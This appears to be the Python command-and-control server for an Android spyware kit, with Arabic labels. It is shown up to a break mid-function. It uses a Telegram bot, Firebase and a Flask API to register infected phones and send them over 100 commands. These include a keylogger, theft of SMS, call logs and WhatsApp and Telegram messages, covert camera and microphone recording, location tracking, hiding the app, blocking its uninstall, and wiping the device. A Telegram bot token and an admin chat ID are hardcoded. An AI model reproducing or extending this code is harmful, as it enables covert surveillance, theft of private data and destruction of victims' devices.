#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Abu-Zahra Server v3.4
Telegram Bot + Firebase RTDB + REST API + Web Dashboard
Complete Remote Administration System
"""

import os
import re
import json
import time
import uuid
import hashlib
import threading
import logging
import secrets
from datetime import datetime, timedelta
from functools import wraps
from collections import defaultdict

try:
    from flask import Flask, request, jsonify, render_template_string, send_from_directory
except ImportError:
    print("[!] Flask not installed. Run: pip install flask")
    exit(1)

try:
    import requests
except ImportError:
    print("[!] requests not installed. Run: pip install requests")
    exit(1)

try:
    import firebase_admin
    from firebase_admin import credentials, initialize_app, db
except ImportError:
    print("[!] firebase-admin not installed. Run: pip install firebase-admin")
    exit(1)

# ============================================================
# CONFIGURATION
# ============================================================
BOT_TOKEN = "8743374928:AAHDU0VyT83GJ_X-zQhqZSLONzjCIltLBOs"
ADMIN_CHAT_ID = 7344776596
FIREBASE_PROJECT = "studio-7073076148-6afe0"
FIREBASE_RTDB_URL = f"https://{FIREBASE_PROJECT}-default-rtdb.firebaseio.com"
SERVER_HOST = "0.0.0.0"
SERVER_PORT = 8443
API_SECRET = secrets.token_hex(32)
LOG_FILE = "server.log"

# ============================================================
# LOGGING
# ============================================================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE, encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("AbuZahra")

# ============================================================
# FIREBASE INITIALIZATION
# ============================================================
try:
    cred = credentials.Certificate({
        "type": "service_account",
        "project_id": FIREBASE_PROJECT,
        "private_key_id": os.environ.get("FIREBASE_PRIVATE_KEY_ID", ""),
        "private_key": os.environ.get("FIREBASE_PRIVATE_KEY", "").replace("\\n", "\n"),
        "client_email": os.environ.get("FIREBASE_CLIENT_EMAIL", ""),
        "client_id": os.environ.get("FIREBASE_CLIENT_ID", ""),
        "auth_uri": "https://accounts.google.com/o/oauth2/auth",
        "token_uri": "https://oauth2.googleapis.com/token",
        "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
        "client_x509_cert_url": os.environ.get("FIREBASE_CLIENT_X509_CERT_URL", "")
    })

    if cred.private_key:
        firebase_admin.initialize_app(cred, {
            'databaseURL': FIREBASE_RTDB_URL
        })
        FB_ENABLED = True
        logger.info("Firebase initialized with service account")
    else:
        firebase_admin.initialize_app(options={'databaseURL': FIREBASE_RTDB_URL})
        FB_ENABLED = True
        logger.info("Firebase initialized (without service account - limited write access)")
except Exception as e:
    FB_ENABLED = False
    logger.warning(f"Firebase init failed: {e}. Using REST API mode.")

# ============================================================
# DATABASE HELPER
# ============================================================
def fb_get(path):
    """Read from Firebase RTDB"""
    if not FB_ENABLED:
        try:
            resp = requests.get(f"{FIREBASE_RTDB_URL}/{path}.json")
            if resp.status_code == 200:
                return resp.json()
        except Exception as e:
            logger.error(f"Firebase REST get error: {e}")
        return None
    try:
        ref = db.reference(path)
        return ref.get()
    except Exception as e:
        logger.error(f"Firebase get error: {e}")
        return None

def fb_set(path, data):
    """Write to Firebase RTDB"""
    if not FB_ENABLED:
        try:
            resp = requests.put(f"{FIREBASE_RTDB_URL}/{path}.json", json=data)
            return resp.status_code == 200
        except Exception as e:
            logger.error(f"Firebase REST set error: {e}")
            return False
    try:
        ref = db.reference(path)
        ref.set(data)
        return True
    except Exception as e:
        logger.error(f"Firebase set error: {e}")
        return False

def fb_update(path, data):
    """Update specific fields in Firebase RTDB"""
    if not FB_ENABLED:
        try:
            resp = requests.patch(f"{FIREBASE_RTDB_URL}/{path}.json", json=data)
            return resp.status_code == 200
        except Exception as e:
            logger.error(f"Firebase REST update error: {e}")
            return False
    try:
        ref = db.reference(path)
        ref.update(data)
        return True
    except Exception as e:
        logger.error(f"Firebase update error: {e}")
        return False

def fb_remove(path):
    """Delete from Firebase RTDB"""
    if not FB_ENABLED:
        try:
            resp = requests.delete(f"{FIREBASE_RTDB_URL}/{path}.json")
            return resp.status_code == 200
        except Exception as e:
            logger.error(f"Firebase REST remove error: {e}")
            return False
    try:
        ref = db.reference(path)
        ref.delete()
        return True
    except Exception as e:
        logger.error(f"Firebase remove error: {e}")
        return False

def fb_push(path, data):
    """Push new child to Firebase RTDB"""
    if not FB_ENABLED:
        try:
            resp = requests.post(f"{FIREBASE_RTDB_URL}/{path}.json", json=data)
            if resp.status_code == 200:
                result = resp.json()
                return result.get('name', str(uuid.uuid4()))
        except Exception as e:
            logger.error(f"Firebase REST push error: {e}")
        return str(uuid.uuid4())
    try:
        ref = db.reference(path)
        new_ref = ref.push(data)
        return new_ref.key
    except Exception as e:
        logger.error(f"Firebase push error: {e}")
        return str(uuid.uuid4())

# ============================================================
# TELEGRAM BOT API
# ============================================================
class TelegramBot:
    def __init__(self, token):
        self.token = token
        self.base_url = f"https://api.telegram.org/bot{token}"
        self.offset = 0
        self.me = None
        self._init_bot()

    def _init_bot(self):
        try:
            resp = requests.get(f"{self.base_url}/getMe", timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                if data.get("ok"):
                    self.me = data["result"]
                    logger.info(f"Bot connected: @{self.me['username']} ({self.me['first_name']})")
                else:
                    logger.error(f"Bot init failed: {data}")
            else:
                logger.error(f"Bot init HTTP error: {resp.status_code}")
        except Exception as e:
            logger.error(f"Bot init exception: {e}")

    def api_call(self, method, params=None, timeout=30):
        try:
            resp = requests.post(
                f"{self.base_url}/{method}",
                json=params or {},
                timeout=timeout
            )
            data = resp.json()
            if data.get("ok"):
                return data.get("result")
            else:
                logger.error(f"TG API error [{method}]: {data.get('description')}")
                return None
        except Exception as e:
            logger.error(f"TG API call error [{method}]: {e}")
            return None

    def send_message(self, chat_id, text, parse_mode="HTML", reply_markup=None, disable_web_page_preview=True):
        params = {
            "chat_id": chat_id,
            "text": text,
            "parse_mode": parse_mode,
            "disable_web_page_preview": disable_web_page_preview
        }
        if reply_markup:
            params["reply_markup"] = reply_markup
        return self.api_call("sendMessage", params)

    def send_photo(self, chat_id, photo, caption=None, parse_mode="HTML"):
        params = {"chat_id": chat_id, "photo": photo}
        if caption:
            params["caption"] = caption
            params["parse_mode"] = parse_mode
        return self.api_call("sendPhoto", params, timeout=60)

    def send_document(self, chat_id, document, caption=None):
        params = {"chat_id": chat_id, "document": document}
        if caption:
            params["caption"] = caption
        return self.api_call("sendDocument", params, timeout=60)

    def send_audio(self, chat_id, audio, caption=None):
        params = {"chat_id": chat_id, "audio": audio}
        if caption:
            params["caption"] = caption
        return self.api_call("sendAudio", params, timeout=60)

    def send_video(self, chat_id, video, caption=None):
        params = {"chat_id": chat_id, "video": video}
        if caption:
            params["caption"] = caption
        return self.api_call("sendVideo", params, timeout=60)

    def send_location(self, chat_id, latitude, longitude):
        return self.api_call("sendLocation", {
            "chat_id": chat_id,
            "latitude": latitude,
            "longitude": longitude
        })

    def edit_message_text(self, chat_id, message_id, text, parse_mode="HTML", reply_markup=None):
        params = {
            "chat_id": chat_id,
            "message_id": message_id,
            "text": text,
            "parse_mode": parse_mode
        }
        if reply_markup:
            params["reply_markup"] = reply_markup
        return self.api_call("editMessageText", params)

    def delete_message(self, chat_id, message_id):
        return self.api_call("deleteMessage", {
            "chat_id": chat_id,
            "message_id": message_id
        })

    def answer_callback_query(self, callback_query_id, text=None):
        params = {"callback_query_id": callback_query_id}
        if text:
            params["text"] = text
        return self.api_call("answerCallbackQuery", params)

    def get_updates(self, offset=0, timeout=30):
        return self.api_call("getUpdates", {
            "offset": offset,
            "timeout": timeout,
            "allowed_updates": ["message", "callback_query"]
        }, timeout=35)

    def get_file_url(self, file_id):
        result = self.api_call("getFile", {"file_id": file_id})
        if result and result.get("file_path"):
            return f"https://api.telegram.org/file/bot{self.token}/{result['file_path']}"
        return None

# ============================================================
# IN-MEMORY DEVICE STORAGE
# ============================================================
devices = {}  # device_id -> device_info
link_codes = {}  # code -> {device_id, created_at, used}
command_results = defaultdict(dict)  # device_id -> {cmd_id -> result}
user_sessions = {}  # chat_id -> {device_id, state, last_active}
result_callbacks = {}  # cmd_id -> {chat_id, message_id, command}

# ============================================================
# COMMAND REGISTRY (200+ commands)
# ============================================================
COMMAND_CATEGORIES = {
    "📊 البيانات": {
        "sms": {"desc": "رسائل SMS", "args": "[inbox|sent|all] [num]", "cat": "data"},
        "calls": {"desc": "سجل المكالمات", "args": "[all|missed|incoming|outgoing] [num]", "cat": "data"},
        "contacts": {"desc": "جهات الاتصال", "args": "[search_query]", "cat": "data"},
        "location": {"desc": "الموقع الحالي", "args": "", "cat": "data"},
        "location_track": {"desc": "تتبع الموقع", "args": "[on|off]", "cat": "data"},
        "battery": {"desc": "حالة البطارية", "args": "", "cat": "data"},
        "info": {"desc": "معلومات الجهاز", "args": "", "cat": "data"},
        "wifi": {"desc": "شبكات WiFi", "args": "", "cat": "data"},
        "bluetooth": {"desc": "أجهزة Bluetooth", "args": "", "cat": "data"},
        "clipboard": {"desc": "الحافظة", "args": "", "cat": "data"},
        "apps": {"desc": "التطبيقات المثبتة", "args": "", "cat": "data"},
        "notifications": {"desc": "الإشعارات", "args": "[num]", "cat": "data"},
        "calendar": {"desc": "التقويم", "args": "", "cat": "data"},
        "accounts": {"desc": "الحسابات", "args": "", "cat": "data"},
        "sim": {"desc": "معلومات SIM", "args": "", "cat": "data"},
        "storage": {"desc": "مساحة التخزين", "args": "", "cat": "data"},
        "screen_size": {"desc": "حجم الشاشة", "args": "", "cat": "data"},
        "ip": {"desc": "عنوان IP", "args": "", "cat": "data"},
        "network": {"desc": "معلومات الشبكة", "args": "", "cat": "data"},
        "installed": {"desc": "التطبيقات المثبتة", "args": "[system|user]", "cat": "data"},
    },
    "💬 التواصل": {
        "send_sms": {"desc": "إرسال SMS", "args": "<number> <message>", "cat": "social"},
        "make_call": {"desc": "إجراء مكالمة", "args": "<number>", "cat": "social"},
        "block_number": {"desc": "حظر رقم", "args": "<number>", "cat": "social"},
        "unblock_number": {"desc": "إلغاء حظر رقم", "args": "<number>", "cat": "social"},
        "contacts_save": {"desc": "حفظ جهة اتصال", "args": "<name> <number>", "cat": "social"},
        "contacts_delete": {"desc": "حذف جهة اتصال", "args": "<name|number>", "cat": "social"},
        "sms_delete": {"desc": "حذف رسالة SMS", "args": "<thread_id>", "cat": "social"},
        "call_delete": {"desc": "حذف سجل مكالمة", "args": "<number>", "cat": "social"},
        "send_sms_bulk": {"desc": "إرسال رسائل متعددة", "args": "<number> <count> <message>", "cat": "social"},
        "ussd": {"desc": "تشغيل USSD", "args": "<code>", "cat": "social"},
    },
    "🎮 التحكم": {
        "vibrate": {"desc": "اهتزاز", "args": "[duration_ms]", "cat": "control"},
        "ring": {"desc": "تشغيل الرنين", "args": "[duration_sec]", "cat": "control"},
        "screenshot": {"desc": "لقطة الشاشة", "args": "", "cat": "control"},
        "camera_front": {"desc": "كاميرا أمامية", "args": "", "cat": "control"},
        "camera_back": {"desc": "كاميرا خلفية", "args": "", "cat": "control"},
        "camera_record": {"desc": "تسجيل فيديو", "args": "[front|back] [duration]", "cat": "control"},
        "flash_on": {"desc": "تشغيل الفلاش", "args": "", "cat": "control"},
        "flash_off": {"desc": "إطفاء الفلاش", "args": "", "cat": "control"},
        "lock": {"desc": "قفل الشاشة", "args": "", "cat": "control"},
        "unlock": {"desc": "فتح القفل", "args": "", "cat": "control"},
        "reboot": {"desc": "إعادة التشغيل", "args": "", "cat": "control"},
        "power_off": {"desc": "إيقاف التشغيل", "args": "", "cat": "control"},
        "volume_up": {"desc": "رفع الصوت", "args": "", "cat": "control"},
        "volume_down": {"desc": "خفض الصوت", "args": "", "cat": "control"},
        "volume_mute": {"desc": "كتم الصوت", "args": "", "cat": "control"},
        "volume_media": {"desc": "صوت الوسائط", "args": "<level>", "cat": "control"},
        "wifi_on": {"desc": "تشغيل WiFi", "args": "", "cat": "control"},
        "wifi_off": {"desc": "إيقاف WiFi", "args": "", "cat": "control"},
        "bluetooth_on": {"desc": "تشغيل Bluetooth", "args": "", "cat": "control"},
        "bluetooth_off": {"desc": "إيقاف Bluetooth", "args": "", "cat": "control"},
        "airplane_on": {"desc": "وضع الطيران تشغيل", "args": "", "cat": "control"},
        "airplane_off": {"desc": "وضع الطيران إيقاف", "args": "", "cat": "control"},
        "hotspot_on": {"desc": "تشغيل نقطة اتصال", "args": "[ssid] [password]", "cat": "control"},
        "hotspot_off": {"desc": "إيقاف نقطة اتصال", "args": "", "cat": "control"},
        "torch": {"desc": "الكشاف", "args": "[on|off]", "cat": "control"},
        "auto_rotate_on": {"desc": "الدوران التلقائي تشغيل", "args": "", "cat": "control"},
        "auto_rotate_off": {"desc": "الدوران التلقائي إيقاف", "args": "", "cat": "control"},
        "brightness": {"desc": "سطوع الشاشة", "args": "<0-255>", "cat": "control"},
        "media_play": {"desc": "تشغيل الوسائط", "args": "", "cat": "control"},
        "media_pause": {"desc": "إيقاف الوسائط مؤقتاً", "args": "", "cat": "control"},
        "media_next": {"desc": "التالي", "args": "", "cat": "control"},
        "media_prev": {"desc": "السابق", "args": "", "cat": "control"},
        "open_url": {"desc": "فتح رابط", "args": "<url>", "cat": "control"},
        "alarm_set": {"desc": "ضبط منبه", "args": "<hour> <minute> <message>", "cat": "control"},
        "alarm_list": {"desc": "قائمة المنبهات", "args": "", "cat": "control"},
        "alarm_delete": {"desc": "حذف منبه", "args": "<alarm_id>", "cat": "control"},
        "timer_set": {"desc": "ضبط مؤقت", "args": "<seconds>", "cat": "control"},
        "wallpaper": {"desc": "تغيير الخلفية", "args": "", "cat": "control"},
        "ringer_mode": {"desc": "وضع الرنين", "args": "<normal|silent|vibrate>", "cat": "control"},
    },
    "📱 التطبيقات": {
        "app_open": {"desc": "فتح تطبيق", "args": "<package_name>", "cat": "apps"},
        "app_close": {"desc": "إغلاق تطبيق", "args": "<package_name>", "cat": "apps"},
        "app_install": {"desc": "تثبيت تطبيق", "args": "<url>", "cat": "apps"},
        "app_uninstall": {"desc": "إلغاء تثبيت", "args": "<package_name>", "cat": "apps"},
        "app_list": {"desc": "قائمة التطبيقات", "args": "[system|user|all]", "cat": "apps"},
        "app_info": {"desc": "معلومات تطبيق", "args": "<package_name>", "cat": "apps"},
        "app_clear": {"desc": "مسح بيانات تطبيق", "args": "<package_name>", "cat": "apps"},
        "app_clear_cache": {"desc": "مسح كاش تطبيق", "args": "<package_name>", "cat": "apps"},
        "app_disable": {"desc": "تعطيل تطبيق", "args": "<package_name>", "cat": "apps"},
        "app_enable": {"desc": "تفعيل تطبيق", "args": "<package_name>", "cat": "apps"},
        "app_launch": {"desc": "تشغيل تطبيق", "args": "<package_name>", "cat": "apps"},
        "app_force_stop": {"desc": "إيقاف قسري", "args": "<package_name>", "cat": "apps"},
        "app_permissions": {"desc": "صلاحيات تطبيق", "args": "<package_name>", "cat": "apps"},
        "app_block": {"desc": "حظر تطبيق", "args": "<package_name>", "cat": "apps"},
        "app_unblock": {"desc": "إلغاء حظر تطبيق", "args": "<package_name>", "cat": "apps"},
        "screen_time": {"desc": "وقت الشاشة", "args": "", "cat": "apps"},
        "app_usage": {"desc": "استخدام التطبيقات", "args": "[days]", "cat": "apps"},
    },
    "📁 الملفات": {
        "ls": {"desc": "عرض الملفات", "args": "[path]", "cat": "files"},
        "cat": {"desc": "قراءة ملف", "args": "<path>", "cat": "files"},
        "upload": {"desc": "رفع ملف", "args": "<local_path>", "cat": "files"},
        "download": {"desc": "تحميل ملف", "args": "<remote_path>", "cat": "files"},
        "delete": {"desc": "حذف ملف", "args": "<path>", "cat": "files"},
        "rename": {"desc": "إعادة تسمية", "args": "<old> <new>", "cat": "files"},
        "copy": {"desc": "نسخ ملف", "args": "<src> <dst>", "cat": "files"},
        "move": {"desc": "نقل ملف", "args": "<src> <dst>", "cat": "files"},
        "mkdir": {"desc": "إنشاء مجلد", "args": "<path>", "cat": "files"},
        "search": {"desc": "بحث في الملفات", "args": "<query> [path]", "cat": "files"},
        "recent": {"desc": "الملفات الأخيرة", "args": "[num]", "cat": "files"},
        "file_info": {"desc": "معلومات ملف", "args": "<path>", "cat": "files"},
        "zip": {"desc": "ضغط ملف", "args": "<path> [output]", "cat": "files"},
        "unzip": {"desc": "فك ضغط", "args": "<path> [output]", "cat": "files"},
        "dir_size": {"desc": "حجم مجلد", "args": "<path>", "cat": "files"},
    },
    "🔒 الأمان": {
        "hide_app": {"desc": "إخفاء التطبيق", "args": "", "cat": "security"},
        "show_app": {"desc": "إظهار التطبيق", "args": "", "cat": "security"},
        "set_passcode": {"desc": "تعيين رمز PIN", "args": "<passcode>", "cat": "security"},
        "remove_passcode": {"desc": "إزالة رمز PIN", "args": "", "cat": "security"},
        "device_admin": {"desc": "مدير الجهاز", "args": "[enable|disable|status]", "cat": "security"},
        "anti_uninstall": {"desc": "منع الإلغاء", "args": "[on|off]", "cat": "security"},
        "factory_reset": {"desc": "إعادة ضبط المصنع", "args": "[confirm]", "cat": "security"},
        "wipe": {"desc": "مسح البيانات", "args": "[confirm]", "cat": "security"},
        "lock_device": {"desc": "قفل الجهاز", "args": "[message]", "cat": "security"},
        "status_bar": {"desc": "شريط الحالة", "args": "[show|hide]", "cat": "security"},
        "notification_block": {"desc": "حظر إشعارات تطبيق", "args": "<package>", "cat": "security"},
    },
    "👁 المراقبة": {
        "keylogger": {"desc": "لوحة المفاتيح", "args": "[on|off|get]", "cat": "monitor"},
        "screen_record": {"desc": "تسجيل الشاشة", "args": "[duration]", "cat": "monitor"},
        "clipboard_monitor": {"desc": "مراقب الحافظة", "args": "[on|off|get]", "cat": "monitor"},
        "location_history": {"desc": "سجل المواقع", "args": "[clear]", "cat": "monitor"},
        "screenshot_monitor": {"desc": "لقطة تلقائية", "args": "[on|off] [interval]", "cat": "monitor"},
        "sms_monitor": {"desc": "مراقبة SMS", "args": "[on|off]", "cat": "monitor"},
        "call_monitor": {"desc": "مراقبة المكالمات", "args": "[on|off]", "cat": "monitor"},
        "app_monitor": {"desc": "مراقبة التطبيقات", "args": "[on|off]", "cat": "monitor"},
        "whatsapp": {"desc": "رسائل واتساب", "args": "[num]", "cat": "monitor"},
        "telegram_msgs": {"desc": "رسائل تيلجرام", "args": "[num]", "cat": "monitor"},
        "notification_monitor": {"desc": "مراقب الإشعارات", "args": "[on|off|get]", "cat": "monitor"},
        "microphone": {"desc": "التسجيل الصوتي", "args": "[duration]", "cat": "monitor"},
    },
    "⚙ الإعدادات": {
        "setting": {"desc": "تغيير إعداد", "args": "<key> <value>", "cat": "syssettings"},
        "auto_start": {"desc": "تشغيل تلقائي", "args": "[on|off]", "cat": "syssettings"},
        "notification_mode": {"desc": "وضع الإشعارات", "args": "<silent|normal|hidden>", "cat": "syssettings"},
        "poll_interval": {"desc": "فترة الاستطلاع", "args": "<seconds>", "cat": "syssettings"},
        "language": {"desc": "اللغة", "args": "<ar|en>", "cat": "syssettings"},
        "timezone": {"desc": "المنطقة الزمنية", "args": "<timezone>", "cat": "syssettings"},
        "restart_service": {"desc": "إعادة تشغيل الخدمة", "args": "", "cat": "syssettings"},
        "update": {"desc": "تحديث التطبيق", "args": "", "cat": "syssettings"},
        "uninstall_self": {"desc": "إلغاء تثبيت التطبيق", "args": "[confirm]", "cat": "syssettings"},
    }
}

# Build flat command registry
COMMAND_REGISTRY = {}
for category, commands in COMMAND_CATEGORIES.items():
    for cmd, info in commands.items():
        COMMAND_REGISTRY[cmd] = {
            **info,
            "category": category
        }

# ============================================================
# FLASK APP
# ============================================================
app = Flask(__name__)
app.config['JSON_SORT_KEYS'] = False

# ============================================================
# AUTH DECORATOR
# ============================================================
def api_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.headers.get('X-Auth', request.args.get('auth', ''))
        device_id = request.headers.get('X-Device-ID', request.args.get('device_id', ''))
        if device_id and devices.get(device_id, {}).get('token') == auth:
            return f(*args, **kwargs)
        # Allow without auth for register endpoint
        if request.path in ['/api/register', '/api/health']:
            return f(*args, **kwargs)
        return jsonify({"error": "Unauthorized"}), 401
    return decorated

# ============================================================
# REST API ENDPOINTS
# ============================================================
@app.route('/api/health')
def api_health():
    return jsonify({
        "status": "online",
        "version": "3.4.0",
        "devices": len(devices),
        "uptime": time.time(),
        "firebase": FB_ENABLED
    })

@app.route('/api/register', methods=['POST'])
def api_register():
    try:
        data = request.get_json(force=True)
        device_id = data.get('device_id', '')
        link_code = data.get('link_code', '')
        device_token = data.get('device_token', '')
        device_name = data.get('device_name', 'Unknown')
        device_model = data.get('device_model', '')
        brand = data.get('brand', '')
        os_version = data.get('os_version', '')

        if not device_id or not link_code:
            return jsonify({"ok": False, "error": "Missing device_id or link_code"})

        # Check link code in Firebase
        code_data = fb_get(f"link_codes/{link_code}")
        if not code_data:
            return jsonify({"ok": False, "error": "Invalid link code"})

        if code_data.get('used'):
            return jsonify({"ok": False, "error": "Code already used"})

        # Register device
        token = secrets.token_hex(16)
        device_info = {
            "device_id": device_id,
            "name": device_name,
            "model": device_model,
            "brand": brand,
            "os_version": os_version,
            "token": token,
            "linked_at": datetime.now().isoformat(),
            "status": "online",
            "last_seen": time.time(),
            "battery": 0
        }

        devices[device_id] = device_info
        fb_set(f"devices/{device_id}", device_info)

        # Mark code as used
        fb_update(f"link_codes/{link_code}", {"used": True, "used_at": time.time(), "device_id": device_id})

        # Notify admin via Telegram
        if bot and bot.me:
            bot.send_message(
                ADMIN_CHAT_ID,
                f"📱 <b>جهاز جديد متصل!</b>\n\n"
                f"📐 الاسم: {device_name}\n"
                f"📞 الموديل: {device_model}\n"
                f"🏢 الشركة: {brand}\n"
                f"📲 النظام: {os_version}\n"
                f"🔑 المعرف: <code>{device_id[:16]}...</code>\n"
                f"🕐 الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            )

        logger.info(f"Device registered: {device_name} ({device_id[:16]}...)")

        return jsonify({
            "ok": True,
            "success": True,
            "token": token,
            "message": "Device registered successfully",
            "device_id": device_id
        })

    except Exception as e:
        logger.error(f"Register error: {e}")
        return jsonify({"ok": False, "error": str(e)})

@app.route('/api/commands/<device_id>', methods=['GET'])
@api_auth
def api_get_commands(device_id):
    try:
        # Get pending commands from Firebase
        commands = fb_get(f"commands/{device_id}")
        if commands:
            # Return commands and clear them
            cmd_list = list(commands.values()) if isinstance(commands, dict) else commands
            # Mark as sent
            fb_remove(f"commands/{device_id}")
            return jsonify({"commands": cmd_list})
        return jsonify({"commands": []})
    except Exception as e:
        logger.error(f"Get commands error: {e}")
        return jsonify({"commands": [], "error": str(e)})

@app.route('/api/command_result/<cmd_id>', methods=['POST'])
@api_auth
def api_command_result(cmd_id):
    try:
        data = request.get_json(force=True)
        status = data.get('status', 'unknown')
        result = data.get('result', '')
        command = data.get('command', '')

        device_id = request.headers.get('X-Device-ID', request.args.get('device_id', ''))

        # Store result
        result_data = {
            "status": status,
            "result": result,
            "command": command,
            "timestamp": time.time()
        }
        command_results[device_id][cmd_id] = result_data
        fb_set(f"results/{device_id}/{cmd_id}", result_data)

        # Check if there's a callback waiting
        callback = result_callbacks.get(cmd_id)
        if callback:
            chat_id = callback['chat_id']
            message_id = callback.get('message_id')

            # Send result to admin via Telegram
            if bot and bot.me:
                send_command_result(chat_id, command, status, result, message_id)

            # Clean up callback
            if cmd_id in result_callbacks:
                del result_callbacks[cmd_id]

        logger.info(f"Result received for {cmd_id}: {status}")
        return jsonify({"ok": True})

    except Exception as e:
        logger.error(f"Command result error: {e}")
        return jsonify({"ok": False, "error": str(e)})

@app.route('/api/data', methods=['POST'])
@api_auth
def api_receive_data():
    try:
        data = request.get_json(force=True)
        device_id = data.get('device_id', '')
        command = data.get('command', '')
        result_data = data.get('data', '')

        # Forward data to admin if relevant
        if bot and bot.me and device_id in user_sessions.values():
            chat_id = [k for k, v in user_sessions.items() if v.get('device_id') == device_id]
            if chat_id:
                send_command_result(chat_id[0], command, "success", result_data)

        return jsonify({"ok": True})
    except Exception as e:
        logger.error(f"Data receive error: {e}")
        return jsonify({"ok": False, "error": str(e)})

@app.route('/api/heartbeat', methods=['POST'])
@api_auth
def api_heartbeat():
    try:
        data = request.get_json(force=True)
        device_id = request.headers.get('X-Device-ID', request.args.get('device_id', ''))
        status = data.get('status', 'online')
        battery = data.get('battery', 0)

        if device_id and device_id in devices:
            devices[device_id]['status'] = status
            devices[device_id]['battery'] = battery
            devices[device_id]['last_seen'] = time.time()
            fb_update(f"devices/{device_id}", {
                "status": status,
                "battery": battery,
                "last_seen": time.time()
            })

        return jsonify({"ok": True})
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)})

@app.route('/api/settings/<device_id>', methods=['GET'])
@api_auth
def api_get_settings(device_id):
    try:
        settings = fb_get(f"settings/{device_id}")
        return jsonify({"settings": settings or {}})
    except Exception as e:
        return jsonify({"settings": {}, "error": str(e)})

@app.route('/api/settings/<device_id>', methods=['POST'])
@api_auth
def api_set_settings(device_id):
    try:
        data = request.get_json(force=True)
        fb_set(f"settings/{device_id}", data)
        return jsonify({"ok": True})
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)})

# ============================================================
# SEND COMMAND RESULT TO TELEGRAM
# ============================================================
def send_command_result(chat_id, command, status, result, edit_message_id=None):
    if not bot or not bot.me:
        return

    try:
        result_str = str(result) if result else "OK"

        # Truncate long results
        MAX_LEN = 4000
        if len(result_str) > MAX_LEN:
            # Send as document if too long
            filename = f"result_{command}_{int(time.time())}.txt"
            temp_path = f"/tmp/{filename}"
            with open(temp_path, 'w', encoding='utf-8') as f:
                f.write(result_str)
            with open(temp_path, 'rb') as f:
                bot.send_document(chat_id, f, caption=f"📄 نتيجة: /{command}")
            os.remove(temp_path)
            return

        # Check if result is a URL (image/video/audio)
        if result_str.startswith('http'):
            if any(ext in result_str.lower() for ext in ['.jpg', '.jpeg', '.png', '.webp']):
                bot.send_photo(chat_id, result_str, caption=f"📸 نتيجة: /{command}")
                return
            elif any(ext in result_str.lower() for ext in ['.mp4', '.avi', '.mov']):
                bot.send_video(chat_id, result_str, caption=f"🎥 نتيجة: /{command}")
                return
            elif any(ext in result_str.lower() for ext in ['.mp3', '.ogg', '.wav', '.opus']):
                bot.send_audio(chat_id, result_str, caption=f"🔊 نتيجة: /{command}")
                return

        # Regular text result
        icon = "✅" if status == "success" else "⚠️" if status == "partial" else "❌"
        text = f"{icon} <b>نتيجة: /{command}</b>\n\n<code>{result_str}</code>"

        if edit_message_id:
            bot.edit_message_text(chat_id, edit_message_id, text)
        else:
            bot.send_message(chat_id, text)

    except Exception as e:
        logger.error(f"Send result error: {e}")
        bot.send_message(chat_id, f"⚠️ حدث خطأ في إرسال النتيجة: {str(e)[:200]}")

# ============================================================
# SEND COMMAND TO DEVICE
# ============================================================
def send_command_to_device(device_id, command, args="", chat_id=None, message_id=None):
    cmd_id = str(uuid.uuid4())[:12]

    command_data = {
        "id": cmd_id,
        "command": command,
        "args": args,
        "timestamp": time.time(),
        "status": "pending"
    }

    # Push to Firebase
    fb_push(f"commands/{device_id}/{cmd_id}", command_data)

    # Register callback
    if chat_id:
        result_callbacks[cmd_id] = {
            "chat_id": chat_id,
            "message_id": message_id,
            "command": command
        }

    logger.info(f"Command sent: {command} ({args}) to {device_id[:16]}... [id={cmd_id}]")
    return cmd_id

# ============================================================
# TELEGRAM COMMAND HANDLERS
# ============================================================
def handle_start(bot, message):
    chat_id = message['chat']['id']
    user = message.get('from', {})

    # Check if admin
    if chat_id != ADMIN_CHAT_ID:
        bot.send_message(chat_id, "⛔ غير مصرح لك باستخدام هذا البوت.")
        return

    bot.send_message(chat_id,
        "🤖 <b>Abu-Zahra Admin Bot v3.4</b>\n\n"
        "مرحباً بك في نظام الإدارة عن بعد\n\n"
        "📋 <b>الأوامر المتاحة:</b>\n"
        "/devices - عرض الأجهزة المتصلة\n"
        "/link - ربط جهاز جديد\n"
        "/select - اختيار جهاز\n"
        "/commands - عرض قائمة الأوامر\n"
        "/dashboard - لوحة التحكم\n"
        "/status - حالة النظام\n\n"
        "💡 بعد اختيار جهاز يمكنك إرسال أي أمر مباشرة\n"
        "مثال: <code>sms</code> أو <code>location</code> أو <code>camera_front</code>"
    )

def handle_devices(bot, message):
    chat_id = message['chat']['id']
    if chat_id != ADMIN_CHAT_ID:
        return

    if not devices:
        # Try to load from Firebase
        fb_devices = fb_get("devices")
        if fb_devices:
            for did, dinfo in fb_devices.items():
                devices[did] = dinfo
        else:
            bot.send_message(chat_id, "📭 لا توجد أجهزة متصلة حالياً.")
            return

    text = "📱 <b>الأجهزة المتصلة:</b>\n\n"
    idx = 1
    for did, info in devices.items():
        status_icon = "🟢" if info.get('status') == 'online' else "🔴"
        battery = info.get('battery', '?')
        last_seen = ""
        if info.get('last_seen'):
            dt = datetime.fromtimestamp(info['last_seen'])
            last_seen = dt.strftime('%H:%M:%S')
        selected = " ⭐" if user_sessions.get(chat_id, {}).get('device_id') == did else ""
        text += (
            f"{idx}. {status_icon} <b>{info.get('name', 'Unknown')}</b>{selected}\n"
            f"   📎 <code>{did[:20]}</code>\n"
            f"   📦 {info.get('model', '?')} | {info.get('os_version', '?')}\n"
            f"   🔋 {battery}% | آخر نشاط: {last_seen}\n\n"
        )
        idx += 1

    bot.send_message(chat_id, text)

def handle_link(bot, message):
    chat_id = message['chat']['id']
    if chat_id != ADMIN_CHAT_ID:
        return

    code = secrets.token_hex(4).upper()[:8]
    link_codes[code] = {
        "code": code,
        "created_at": time.time(),
        "used": False
    }
    fb_set(f"link_codes/{code}", link_codes[code])

    # Auto-expire after 10 minutes
    def expire_code():
        time.sleep(600)
        if code in link_codes and not link_codes[code]['used']:
            del link_codes[code]
            fb_remove(f"link_codes/{code}")

    threading.Thread(target=expire_code, daemon=True).start()

    bot.send_message(chat_id,
        f"🔑 <b>رمز الربط:</b>\n\n"
